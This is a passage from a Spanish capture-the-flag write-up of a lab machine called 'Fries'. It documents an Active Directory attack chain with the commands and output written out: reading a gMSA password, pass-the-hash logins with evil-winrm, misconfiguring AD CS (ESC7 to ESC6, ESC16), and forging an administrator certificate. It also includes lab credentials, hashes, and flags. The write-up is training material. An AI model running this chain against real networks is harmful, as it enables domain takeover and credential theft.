Nos logueamos con las credenciales propocionadas por la herramienta, entrando nos pedira cambiar las credenciales y ya nos metera dentro:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Una vez dentro vamos a importar el `.zip` y tendremos que esperar un poco a que cargue todos los datos, despues cuando vayamos al `dashboard` principal veremos todos los datos, vamos a investigar el usuario `svc_infra` a ver que tiene.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-26 133510.png" alt=""><figcaption></figcaption></figure>

Vemos que tiene los privilegios de `ReadMSAPassword` frente al usuario `GMSA_CA_PROD$`.

### ReadMSAPassword sobre GMSA\_CA\_PROD$

```shell
bloodyAD --host <IP> -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
```

Info:

```
distinguishedName: CN=gMSA_CA_prod,CN=Managed Service Accounts,DC=fries,DC=htb
msDS-ManagedPassword.NT: fc20b3d3ec179c5339ca59fbefc18f4a
msDS-ManagedPassword.B64ENCODED: 9cb/xZB5W7WX099zkewhy07gX+Wjk+gD3lBgbFjCO8yOtfvp7k5BzAU/3Y4IptbwYjFScFEJmX0uptsxl2F/7w5/9vVK9P3HwSFbSW9MNsVXMYs2+d1xKTedpjjR9Cpt/1SWTqss3AJie6S4vOTsAFJBnOMiHEm/TwdRGZe75dxp07hdRTgKOHyYZ8zl1bAYkTNfCWm+lX4Oy7TEoOaijjCTWcygmkpcigGGQCtgrr5ycyEh667cWmYfUQ0Rfw5d8W56YynXM95RmvvTDaSs8S5Tm6p3VxSVR4+sqGnrF3mGCZF/XVeNc7fEVofv71v+oqJzKStLMf8TrNKs9ggt6A==
```

### evil-winrm (GMSA\_CA\_PROD$)

Ahora vamos a realizar un `Pass-The-Hash` mediante `WinRM` de esta forma:

```shell
evil-winrm -i <IP> -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents>whoami
fries\gmsa_ca_prod$
```

Veremos que ha funcionado, por lo que recordemos que estamos en una cuenta donde tenemos el poder de crear certificados o generarlos a nuestro gusto, vamos a intentar obtener un certificado autofirmado como el usuario `administrador` como hicimos anteriormente con `root` de forma parecida.

## Escalate Privileges

### Certipy-ad (Templates Vulnerables)

Desde nuestra maquina `kali` utilizaremos la utilidad de `certipy-ad` para ver las `templates` que son `vulnerables` y utilizando las credenciales de dicho usuario.

```shell
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fries-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fries-DC01-CA'
[*] Checking web enrollment for CA 'fries-DC01-CA' @ 'DC01.fries.htb'
[*] Saving text output to '20251126121700_Certipy.txt'
[*] Wrote text output to '20251126121700_Certipy.txt'
[*] Saving JSON output to '20251126121700_Certipy.json'
[*] Wrote JSON output to '20251126121700_Certipy.json'
```

Vemos varios archivos que se nos han generado, tendremos que investigarlos.

### Configuracion de `ESC7` a `ESC6`

Si investigamos un poco veremos que la `ESC7` es la que nos interesa:

```
[!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
```

Ahora podemos escalar el `ESC7` al `ESC6`.

URL = [ESC7 a ESC6 Configuración](https://www.thehacker.recipes/ad/movement/adcs/access-controls#esc7-exposing-to-esc6)

```powershell
Import-Module PSPKI
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$configReader.SetRootNode($true)
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

Importamos el modulo necesario y habilitamos el `template`, hecho esto vamos a verificar que funciono:

```powershell
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

Info:

```
1376590
```

Vemos que esta habilitado ya de forma correcta que es el numero `1376590`.

### Habilitar el `ESC16` y asi deshabilitar la seguridad

Ahora podemos añadir la extensión OID `1.3.6.1.4.1.311.25.2` a la lista de extensiones deshabilitadas para habilitar el `ESC16`.

> Informacion extra

La vulnerabilidad `ESC16` se produce cuando una Autoridad de Certificación (CA) está configurada para deshabilitar la inclusión del OID `1.3.6.1.4.1.311.25.2` (la extensión de seguridad) en todos los certificados que emite, o si no se ha aplicado el parche `KB5014754`. Esta falla hace que la `CA` se comporte como si todas sus plantillas publicadas fueran vulnerables al vector `ESC9`.

```powershell
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$configReader.SetRootNode($true)
$ConfigReader.SetConfigEntry("1.3.6.1.4.1.311.25.2", "DisableExtensionList", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

Ahora vamos a comprobarlo de esta forma:

```shell
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable -stdout
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fries-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fries-DC01-CA'
[*] Checking web enrollment for CA 'fries-DC01-CA' @ 'DC01.fries.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fries-DC01-CA
    DNS Name                            : DC01.fries.htb
    Certificate Subject                 : CN=fries-DC01-CA, DC=fries, DC=htb
    Certificate Serial Number           : 26117C1FFA5705AF443B7E82E8C639A9
    Certificate Validity Start          : 2025-11-18 05:39:18+00:00
    Certificate Validity End            : 3024-05-19 14:11:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FRIES.HTB\Administrators
      Access Rights
        ManageCa                        : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        ManageCertificates              : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        Enroll                          : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\Domain Computers
                                          FRIES.HTB\Authenticated Users
    [+] User Enrollable Principals      : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\Authenticated Users
                                          FRIES.HTB\Domain Computers
    [+] User ACL Principals             : FRIES.HTB\gMSA_CA_prod
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
      ESC6                              : Enrollee can specify SAN.
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

### Explotacion de `ESC6`

Ahora vamos a `explotar` la vulnerabilidad de `ESC6` de esta forma:

URL = [Privilege Escalation ESC6](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc6-ca-allows-san-specification-via-request-attributes)

```shell
certipy-ad req -u "svc_infra" -p "m6tneOMAh5p0wQ0d" -dc-ip "<IP>" -ca 'fries-DC01-CA' -template 'User' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 53
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Veremos que se nos ha generado de forma correcta el certificado autenticado como el `Administrador`, por lo que vamos a utilizarlo para autenticarnos y obtener el `Hash` de dicho `administrador`.

> Obtener el `SID` del `Administrador`

```powershell
Get-ADUser Administrator
```

```shell
ntpdate fries.htb ; certipy-ad auth -pfx "administrator.pfx" -dc-ip '<IP>' -username 'Administrator' -domain 'fries.htb'
```

Info:

```
2025-11-27 11:14:06.774696 (-0800) +2178.775048 +/- 0.013958 fries.htb 10.10.11.96 s1 no-leap
CLOCK: time stepped by 2178.775048
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fries.htb'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

Veremos que ha funcionado y hemos obtenido de forma correcta el `hash`, por lo que vamos a realizar un `Pass-The-Hash` con `evil-winrm`.

### evil-winrm (Administrador)

```shell
evil-winrm -i <IP> -u 'Administrator' -H a773cb05d79273299a684a23ede56748
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fries\administrator
```

Con esto veremos que ya estaremos dentro como el usuario `Administrador` por lo que leeremos las `2` flags tanto del usuario como de `root`.

> root.txt

```
ba1b9a3fb395f12d82f23d8746c0c7e6
```

> user.txt

```
57c47b38b18adfb4d0424ea14ce7cc37
```
